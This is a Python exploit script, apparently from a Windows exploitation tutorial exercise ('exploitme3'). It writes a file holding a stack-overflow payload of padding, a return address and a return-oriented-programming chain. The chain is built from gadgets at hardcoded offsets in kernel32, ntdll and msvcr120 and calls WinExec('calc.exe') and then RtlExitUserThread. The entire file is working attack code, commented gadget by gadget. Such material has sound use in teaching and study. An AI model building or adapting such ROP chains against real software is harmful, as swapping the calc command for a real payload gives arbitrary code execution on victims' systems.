import struct

p32 = lambda x : struct.pack('<I', x)

kernel32 = 0x776e0000
ntdll = 0x77b10000
msvcr120 = 0x6f980000

def write_file(file_path):
	WinExec = kernel32 + 0x8e5fd
	RtlExitUserThread = ntdll + 0x2f611

	lpCmdLine = 0xffffffff
	uCmdShow = 0x1010101
	dwExitCode = 0xffffffff
	ret_RtlExitUserThread = 0xffffffff

	# These are just padding values
	for_ebp = 0xffffffff
	for_ebx = 0xffffffff
	for_esi = 0xffffffff
	for_retn = 0xffffffff

	rop_chain = [
		msvcr120 + 0xc03ad,		# add esp,0x24 # pop ebp # retn
	# cmd
		'calc',
		'.exe',
	# cmd + 0x8
		0xffffffff,				# zeroed out at runtime
	# cmd + 0xc
		WinExec,
		RtlExitUserThread,
	# cmd + 0x14
		lpCmdLine,				# arg1 of WinExec(computed at runtime)
		uCmdShow,				# arg2 of WinExec
		ret_RtlExitUserThread,	# not used
		dwExitCode,				# arg1 of RtlExitUserThread
	# cmd + 0x24
		for_ebp,
		ntdll + 0xa2991,		# inc esi # push esp # mov eax,edi # pop edi # pop esi # pop ebp # retn 0x4
		# now edi = here

	# here
		for_esi,
		for_ebp,
		msvcr120 + 0xaf152,		# xchg eax,edi # retn
		for_retn,
		# now eax = here

		msvcr120 + 0x8f33d,		# sub eax,0x7 # pop ebx # pop ebp # retn
		for_ebx,
		for_ebp,
		msvcr120 + 0x8f33d,		# sub eax,0x7 # pop ebx # pop ebp # retn
		for_ebx,
		for_ebp,
		msvcr120 + 0x8f33d,		# sub eax,0x7 # pop ebx # pop ebp # retn
		for_ebx,
		for_ebp,
		msvcr120 + 0x8f33d,		# sub eax,0x7 # pop ebx # pop ebp # retn
		for_ebx,
		for_ebp,
		msvcr120 + 0x8f33d,		# sub eax,0x7 # pop ebx # pop ebp # retn
		for_ebx,
		for_ebp,
		msvcr120 + 0xbfdf5,		# sub eax,0x2 # pop ebp # retn
		for_ebp,
		kernel32 + 0x7a169,		# inc eax # retn
		# now eax = cmd + 0x8

		# do [cmd + 0x8] = 0
		msvcr120 + 0x75563,		# xor ecx,ecx # xchg ecx,[eax] # pop esi # pop ebp # retn
		for_esi,
		for_ebp,
		msvcr120 + 0xbfdf5,		# sub eax,0x2 # pop ebp # retn
		for_ebp,
		# now eax + 0xe = cmd + 0x14 (i.e. eax = cmd + 0x6)

		# do ecx = eax
		msvcr120 + 0x46ddb,		# xchg eax,ecx # mov edx,0x653fb4a5 # retn
		kernel32 + 0xa85a9,		# xor eax,eax # retn
		kernel32 + 0xb3f13,		# xor eax,ecx # pop ebp # retn 0x8
		for_ebp,
		msvcr120 + 0xbfdf5,		# sub eax,0x2 # pop ebp # retn
		for_retn,
		for_retn,
		for_ebp,
		msvcr120 + 0xbfdf5,		# sub eax,0x2 # pop ebp # retn
		for_ebp,
		msvcr120 + 0xbfdf5,		# sub eax,0x2 # pop ebp # retn
		for_ebp,
		# now eax = cmd

		msvcr120 + 0x46ddb,		# xchg eax,ecx # mov edx,0x653fb4a5 # retn
		# now eax + 0xe = cmd + 0x14
		# now ecx = cmd

		kernel32 + 0x996a6,		# mov [eax + 0xe],ecx # pop ebp # retn 0x10
		for_ebp,
		msvcr120 + 0x46ddb,		# xchg eax,ecx # mov edx,0x653fb4a5 # retn
		for_retn,
		for_retn,
		for_retn,
		for_retn,
		msvcr120 + 0x1ac65,		# add eax,0xc # retn
		# now eax = cmd + 0xc

		# do esp = cmd + 0xc
		kernel32 + 0x43ac0		# xchg eax,esp # retn
	]

	rop_chain = ''.join([x if type(x) is str else p32(x)
		for x in rop_chain])

	with open(file_path, 'wb') as f:
		retn = kernel32 + 0x52357

		payload = 'a' * 36
		payload += p32(retn)
		payload += rop_chain

		f.write(payload)

write_file(r'c:\\exploitme3\\name.dat')